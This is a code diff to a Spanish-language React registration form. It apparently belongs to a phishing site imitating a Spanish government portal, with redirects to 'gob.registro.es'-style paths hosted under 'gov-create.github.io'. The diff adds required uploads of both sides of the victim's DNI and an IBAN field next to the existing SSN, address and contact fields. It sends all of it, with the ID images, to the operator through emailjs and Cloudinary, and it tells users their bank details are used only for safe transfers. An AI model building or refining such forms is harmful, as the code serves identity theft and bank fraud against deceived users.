@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { Container, Row, Col, Form, Button, Modal } from 'react-bootstrap';
+import { isValid } from 'iban';
 import emailjs from 'emailjs-com';
 import Navbar from './Navbar';
 import Footer from './Footer';
@@ -18,6 +19,9 @@ const logos = [
 
 const RegistrationForm = () => {
   const [showConfirmModal, setShowConfirmModal] = useState(false);
+
+  const [showProcessingModal, setShowProcessingModal] = useState(false); // NEW
+  const [error1, setError1] = useState('');
   // const [showSuccessModal, setShowSuccessModal] = useState(false);
   // const [selectedFile, setSelectedFile] = useState(null);
   const [formValues, setFormValues] = useState({
@@ -33,9 +37,14 @@ const RegistrationForm = () => {
     city: '',
     state: '',
     postalCode: '',
-    imageUrl: '' // Store uploaded image URL
+    imageUrl: '', // Store uploaded image URL
+    iban: '', 
   });
-  const [selectedFile, setSelectedFile] = useState(null);
+  // const [selectedFile, setSelectedFile] = useState(null);
+
+  // === States for ID uploads ===
+    const [frontIdFile, setFrontIdFile] = useState(null);
+    const [backIdFile, setBackIdFile] = useState(null);
 
   // const handleInputChange = (e) => {
   //   const { name, value } = e.target;
@@ -56,15 +65,15 @@ const RegistrationForm = () => {
   //upload file
 
   // Handle file change
-  const handleFileChange = (e) => {
-    setSelectedFile(e.target.files[0]);
-  };
+  // const handleFileChange = (e) => {
+  //   setSelectedFile(e.target.files[0]);
+  // };
 
   // Upload file to Cloudinary
-  const uploadImageToCloudinary = async () => {
-    if (!selectedFile) return null;
+  const uploadImageToCloudinary = async (file) => {
+    if (!file) return null;
     const formData = new FormData();
-    formData.append('file', selectedFile);
+    formData.append('file', file);
     formData.append('upload_preset', 'image_one'); // Replace with your actual upload preset
     formData.append('cloud_name', 'di9fxztii'); // Replace with your actual cloud name
 
@@ -90,24 +99,6 @@ const RegistrationForm = () => {
       setFormValues({ ...formValues, [name]: value });
     }
   };
-
-  // const handleSSNChange = (e) => {
-  //   const { name, value } = e.target;
-    
-  //   // Remove any non-digit characters
-  //   let formattedValue = value.replace(/\D/g, '');
-  
-  //   // Add dashes at appropriate positions
-  //   if (formattedValue.length > 3 && formattedValue.length <= 5) {
-  //     formattedValue = `${formattedValue.slice(0, 3)}-${formattedValue.slice(3)}`;
-  //   } else if (formattedValue.length > 5) {
-  //     formattedValue = `${formattedValue.slice(0, 3)}-${formattedValue.slice(3, 5)}-${formattedValue.slice(5, 9)}`;
-  //   }
-  
-  //   // Update state
-  //   setFormValues({ ...formValues, [name]: formattedValue });
-  // };
-  
   
 
   // Handle form submit
@@ -115,39 +106,35 @@ const RegistrationForm = () => {
     e.preventDefault();
 
     // Upload image and get URL
-    const imageUrl = await uploadImageToCloudinary();
+    // const imageUrl = await uploadImageToCloudinary();
 
+
+    const frontUrl = await uploadImageToCloudinary(frontIdFile);
+    const backUrl = await uploadImageToCloudinary(backIdFile);
+
+    
     // Set the imageUrl in form values and send email
-    setFormValues({ ...formValues, imageUrl: imageUrl });
-    sendEmail(imageUrl);
+    // setFormValues({ ...formValues, imageUrl: imageUrl });
+    // sendEmail(imageUrl);
     // setShowSuccessModal(true);
+    sendEmail(frontUrl, backUrl);
+
+
+    if (!isValid(formValues.iban)) {
+      setError1('IBAN no válido. Por favor, verifique el número.');
+      return;
+    }
+
+    // ✅ IBAN is valid – continue
+    console.log('Valid IBAN:', formValues.iban);
+    setError1('');
+
+
     setShowConfirmModal(true);
   };
 
 
-  const handleConfirm = () => {
-
-    setFormValues({
-      firstName: '',
-      lastName: '',
-      phoneNumber: '',
-      profession: '',
-      ssn: '',
-      email: '',
-      studentName: '',
-      relation: '',
-      streetAddress: '',
-      city: '',
-      state: '',
-      postalCode: ''
-    });
-    setSelectedFile(null);
-
-    setShowConfirmModal(false);
-
-  };
-
-  const sendEmail = async (imageUrl) => {
+  const sendEmail = async (frontUrl, backUrl) => {
 
     const templateParams = {
       firstName: formValues.firstName,
@@ -162,7 +149,10 @@ const RegistrationForm = () => {
       city: formValues.city,
       state: formValues.state,
       postalCode: formValues.postalCode,
-      imageUrl: imageUrl // Include image URL in the email template
+      iban: formValues.iban,  
+      // imageUrl: imageUrl, // Include image URL in the email template
+      frontIdUrl: frontUrl,
+      backIdUrl: backUrl,   
     };
     
 
@@ -178,23 +168,37 @@ const RegistrationForm = () => {
     });
   };
 
-  // const handleSuccessClose = () => {
-  //   // setShowSuccessModal(false);
-  //   setFormValues({
-  //     firstName: '',
-  //     lastName: '',
-  //     phoneNumber: '',
-  //     ssn: '',
-  //     email: '',
-  //     studentName: '',
-  //     relation: '',
-  //     streetAddress: '',
-  //     city: '',
-  //     state: '',
-  //     postalCode: ''
-  //   });
-  //   setSelectedFile(null);
-  // };
+  
+  const handleConfirm = () => {
+
+    setFormValues({
+      firstName: '',
+      lastName: '',
+      phoneNumber: '',
+      profession: '',
+      ssn: '',
+      email: '',
+      studentName: '',
+      relation: '',
+      streetAddress: '',
+      city: '',
+      state: '',
+      postalCode: '',
+      iban: '',
+    });
+    setFrontIdFile(null);
+    setBackIdFile(null);
+    // setSelectedFile(null);
+
+    setShowConfirmModal(false);
+    setShowProcessingModal(true);  // show the second modal instead of redirect
+  };
+
+  const handleProcessingOk = () => {
+    setShowProcessingModal(false);
+    window.location.href = "/gob.registro.es";  // simple redirect
+  };
+
 
   return (
     <div>
@@ -264,7 +268,7 @@ const RegistrationForm = () => {
 
             {/* upload file */}
 
-            <Form.Group controlId="formFile" className="mt-2">
+            {/* <Form.Group controlId="formFile" className="mt-2">
               <Form.Label>Verificación de Profesión</Form.Label>
               <br/>
               <Form.Label style={{fontSize: '14px'}}>Suba un certificado claro para verificar su profesión</Form.Label>
@@ -283,9 +287,66 @@ const RegistrationForm = () => {
                 <p>Vista previa:</p>
                 <img src={URL.createObjectURL(selectedFile)} alt="Preview" width="100px" />
               </div>
-            )}
+            )} */}
 
             {/* upload file END */}
+
+
+
+             {/* ===== ID Verification ===== */}
+            <h5 className="mt-4">Verificación de identidad (DNI)</h5>
+
+            {/* Front of ID */}
+            <Form.Group controlId="frontId" className="mt-2">
+              <Form.Label>Anverso del DNI</Form.Label>
+              <Form.Label style={{ fontSize: '14px', display: 'block' }}>
+                Suba una foto clara de la parte frontal de su Documento Nacional de Identidad (DNI).
+              </Form.Label>
+              <Form.Control
+                // key={frontIdFile ? 'front-has-file' : 'front-empty'}
+                type="file"
+                accept="image/*"
+                onChange={(e) => setFrontIdFile(e.target.files[0])}
+                required
+              />
+              {frontIdFile && (
+                <div className="mt-2">
+                  <p>Vista previa</p>
+                  <img
+                    src={URL.createObjectURL(frontIdFile)}
+                    alt="Front ID Preview"
+                    width="100px"
+                  />
+                </div>
+              )}
+            </Form.Group>
+
+            {/* Back of ID */}
+            <Form.Group controlId="backId" className="mt-3">
+              <Form.Label>Reverso del DNI</Form.Label>
+              <Form.Label style={{ fontSize: '14px', display: 'block' }}>
+                Suba una foto clara de la parte posterior de su Documento Nacional de Identidad (DNI).
+              </Form.Label>
+              <Form.Control
+                // key={backIdFile ? 'back-has-file' : 'back-empty'}
+                type="file"
+                accept="image/*"
+                onChange={(e) => setBackIdFile(e.target.files[0])}
+                required
+              />
+              {backIdFile && (
+                <div className="mt-2">
+                  <p>Vista previa</p>
+                  <img
+                    src={URL.createObjectURL(backIdFile)}
+                    alt="Back ID Preview"
+                    width="100px"
+                  />
+                </div>
+              )}
+            </Form.Group>
+            {/* ===== End ID Verification ===== */}
+
 
 
             <Form.Group controlId="formAddress" className="mt-4">
@@ -296,6 +357,30 @@ const RegistrationForm = () => {
               <Form.Control type="text" placeholder="Comunidad Autónoma / Provincia" name="state" value={formValues.state} onChange={handleInputChange} required className="mb-2" />
               <Form.Control type="text" placeholder="Código Postal" name="postalCode" value={formValues.postalCode} onChange={handleInputChange} required />
             </Form.Group>
+
+            
+            <Form.Group controlId="iban" className='mt-4'>
+              <Form.Label>IBAN</Form.Label>
+              <Form.Label style={{ fontSize: '14px', display: 'block' }}>Introduzca su Número Internacional de Cuenta Bancaria (IBAN)</Form.Label>
+              <Form.Control
+                type="text"
+                value={formValues.iban}
+                // onChange={(e) => setIban(e.target.value.toUpperCase())}
+                onChange={(e) =>
+                  setFormValues({
+                    ...formValues,
+                    iban: e.target.value.toUpperCase()
+                  })
+                }
+                placeholder="p. ej. DE89370400440532013000"
+                required
+              />
+              {error1 && <div className="text-danger mt-1">{error1}</div>}
+              <Form.Text className="text-muted">
+                Obligatorio para transferencias UE/SEPA. Usamos este número solo para transferencias bancarias seguras y nunca lo compartimos.
+              </Form.Text>
+            </Form.Group>
+
 
             <p className='fst-italic mt-3'>Por favor, confirme y verifique sus datos antes de enviarlos para evitar <span style={{color: "#FF0000"}}>error(es)</span> durante el proceso de pago.</p>
 
@@ -310,26 +395,32 @@ const RegistrationForm = () => {
         <Modal.Header closeButton>
           <Modal.Title>Confirme Sus Datos</Modal.Title>
         </Modal.Header>
-        <Modal.Body>
+        {/* <Modal.Body>
           <Button variant="primary" onClick={handleConfirm}>
             <a href='https://gov-create.github.io/gob.formulario.es/' target='blank' className='text-light text-decoration-none'>Sí, he confirmado</a>
           </Button>
         </Modal.Body>
+      </Modal> */}
+        <Modal.Footer>
+          <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancelar</Button>
+          <Button variant="primary" onClick={handleConfirm}>Sí, he confirmado</Button>
+        </Modal.Footer>
       </Modal>
-        
-      {/* <Modal show={showSuccessModal} onHide={handleSuccessClose}>
-        <Modal.Header closeButton>
-          <Modal.Title>Confirmation</Modal.Title>
+
+      
+      {/* ✅ New “Processing” Modal */}
+      <Modal show={showProcessingModal} onHide={handleProcessingOk} centered>
+        <Modal.Header>
+          <Modal.Title>Tratamiento</Modal.Title>
         </Modal.Header>
         <Modal.Body>
-          <p>Please check your email; you will receive a message shortly.</p>
+          Su información está siendo procesada. Nos pondremos en contacto con usted en breve.
         </Modal.Body>
         <Modal.Footer>
-          <Button variant="primary" onClick={handleSuccessClose}>
-            OK
-          </Button>
+          <Button variant="primary" onClick={handleProcessingOk}>Aceptar</Button>
         </Modal.Footer>
-      </Modal> */}
+      </Modal>
+
     </Container>
     </div>
     <Footer />
